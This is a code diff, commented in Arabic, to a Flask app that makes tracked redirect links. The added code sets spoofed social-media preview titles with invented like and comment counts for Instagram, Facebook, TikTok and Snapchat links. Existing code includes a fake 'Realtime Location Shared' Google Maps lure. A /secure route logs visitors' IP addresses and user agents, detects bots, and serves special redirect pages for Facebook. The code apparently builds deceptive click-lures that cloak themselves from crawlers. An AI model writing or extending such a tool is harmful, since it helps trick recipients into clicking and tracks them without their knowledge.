@@ -98,19 +98,23 @@ def fetch_original_meta(url, manual_thumb_url=None):
     title = "Watch Trending Video Content in HD Quality"
     img = "https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?w=600"
     
+    # 1. التحقق أولاً إذا قام المستخدم بوضع رابط صورة يدوي (لسناب شات، فيسبوك، إنستغرام، تيك توك)
     if manual_thumb_url and manual_thumb_url.strip():
         img_final = manual_thumb_url.strip()
         if img_final.startswith('http://'):
             img_final = img_final.replace('http://', 'https://')
             
         if "instagram.com" in url_lower:
-            title = "Instagram Post Media Player"
+            title = "1.2 M likes, 14.5K comments | Reel by Instagram"
         elif "facebook.com" in url_lower or "fb.watch" in url_lower:
-            title = "Facebook Video Player HD"
+            title = "14M vues 1,6 M likes | Reel by The|facebook"
         elif "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
-            title = "TikTok Video Content Player"
+            title = "#fyp#foryou#viral#viral|tiktok.com"
+        elif "snapchat.com" in url_lower:
+            title = "12K likes, 16 comments, and 38 shares|snapchat.com| Challenge with Friends."
         return title, img_final
         
+    # 2. جلب تلقائي لروابط يوتيوب
     if "youtube.com" in url_lower or "youtu.be" in url_lower:
         title = "YouTube Video Stream Player HD"
         video_id = None
@@ -132,11 +136,33 @@ def fetch_original_meta(url, manual_thumb_url=None):
             img = f"https://img.youtube.com/vi/{video_id}/hqdefault.jpg"
         return title, img
 
+    # 3. 🚀 جلب تلقائي لروابط تيك توك باستخدام oEmbed الذكي
+    if "tiktok.com" in url_lower or "vt.tiktok" in url_lower:
+        title = "#fyp#foryou#viral#viral|tiktok.com"
+        try:
+            oembed_url = f"https://www.tiktok.com/oembed?url={url}"
+            response = requests.get(oembed_url, timeout=5)
+            if response.status_code == 200:
+                data = response.json()
+                img = data.get('thumbnail_url', img)
+        except Exception as e:
+            print(f"TikTok oEmbed Error: {e}")
+        return title, img
+
+    # 4. روابط خرائط جوجل
     if "goo.gl/maps" in url_lower or "maps.google" in url_lower:
         title = "Google Maps - Realtime Location Shared"
         img = "https://images.unsplash.com/photo-1524661135-423995f22d0b?w=600"
         return title, img
         
+    # 5. تعيين العناوين المخصصة الافتراضية في حال لم يتم رفع صورة يدوية للمنصات الباقية
+    if "instagram.com" in url_lower:
+        title = "1.2 M likes, 14.5K comments | Reel by Instagram"
+    elif "facebook.com" in url_lower or "fb.watch" in url_lower:
+        title = "14M vues 1,6 M likes | Reel by The|facebook"
+    elif "snapchat.com" in url_lower:
+        title = "12K likes, 16 comments, and 38 shares|snapchat.com| Challenge with Friends."
+
     return title, img
 
 def check_auth(username, password):
@@ -246,12 +272,13 @@ DASHBOARD_LAYOUT = '''
                 warningTitle.innerText = "⚠️ Facebook Link Detected:";
                 extractorLink.href = "https://thumbnail-downloader.com/Facebook";
                 manualInput.required = true;
-            } else if (low.includes("tiktok.com") || low.includes("vt.tiktok")) {
+            } else if (low.includes("snapchat.com")) {
                 thumbWrapper.style.display = "block";
-                warningTitle.innerText = "⚠️ TikTok Link Detected (Cloud Upload Active):";
-                extractorLink.href = "https://thumbnail-downloader.com/tiktok";
+                warningTitle.innerText = "⚠️ Snapchat Link Detected:";
+                extractorLink.href = "https://sc.snaplytics.io/snapchat-video-downloader/";
                 manualInput.required = true;
             } else {
+                // تيك توك وباقي الروابط تعمل تلقائياً الآن دون الحاجة لصندوق المساعدة
                 thumbWrapper.style.display = "none";
                 manualInput.required = false;
             }
@@ -565,9 +592,6 @@ def delete_link(link_id):
         conn.commit()
     return redirect('/my-links')
 
-# =========================================================================
-# 🚀 التعديل الذكي لحماية الـ FBPage والإبقاء على استقرار باقي البوتات والميسنجر
-# =========================================================================
 @app.route('/secure/<link_id>', defaults={'subpath': ''})
 @app.route('/secure/<link_id>/<path:subpath>')
 def secure_redirect(link_id, subpath):
@@ -626,10 +650,8 @@ def secure_redirect(link_id, subpath):
             if ip_address and ',' in ip_address:
                 ip_address = ip_address.split(',')[0].strip()
                 
-            # تسجيل الزيارة في قاعدة البيانات عبر الدالة الموحدة المضافة بالأعلى
             log_bot_click(link_id, ip_address, ua_raw, bot_detected)
                 
-            # ✨ [معالجة خاصة وحصرية لـ FBPage] بدون Meta Refresh
             if target == "FBPage":
                 return f'''
                 <!DOCTYPE html>
@@ -659,7 +681,6 @@ def secure_redirect(link_id, subpath):
                 </html>
                 '''
             
-            # 🔄 المعالجة التقليدية المعتادة لباقي المنصات (مثل Messenger و Telegram) مع الـ Refresh
             return f'''
             <!DOCTYPE html>
             <html>
